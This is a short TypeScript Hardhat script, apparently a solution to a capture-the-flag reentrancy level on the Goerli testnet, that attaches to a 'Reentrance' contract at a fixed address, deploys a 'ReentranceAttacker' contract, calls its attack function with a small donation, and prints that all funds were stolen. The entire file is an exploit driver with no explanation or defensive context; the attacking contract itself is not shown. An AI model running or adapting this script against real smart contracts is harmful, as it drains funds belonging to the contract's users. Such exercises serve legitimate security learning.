import { TransactionResponse } from "@ethersproject/providers"
import { ethers } from "hardhat";
import * as dotenv from "dotenv";

dotenv.config();

const provider = new ethers.providers.JsonRpcProvider(process.env.GOERLI_URL)
const privateKey: string = process.env.PRIVATE_KEY || ""
const attacker = new ethers.Wallet(privateKey, provider)

const CONTRACT_NAME = "Reentrance"
const CONTRACT_ADDRESS = "0x1dEB07b7a20EE884378E8b395156EBB8004261D2"
const CONTRACT_NAME_ATTACKER = "ReentranceAttacker"

async function main() {
    const Reentrance = await ethers.getContractFactory(CONTRACT_NAME)
    const reentrance = Reentrance.attach(CONTRACT_ADDRESS)

    const ReentranceAttacker = await ethers.getContractFactory(CONTRACT_NAME_ATTACKER)
    const attackerContract = await ReentranceAttacker.connect(attacker).deploy(CONTRACT_ADDRESS)
    await attackerContract.deployed()

    const donation = ethers.utils.parseEther("0.001")
    const tx: TransactionResponse = await attackerContract.connect(attacker).attack( { value: donation } )
    await tx.wait()

    console.log("Reentrance: stolen all the funds from the contract");
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });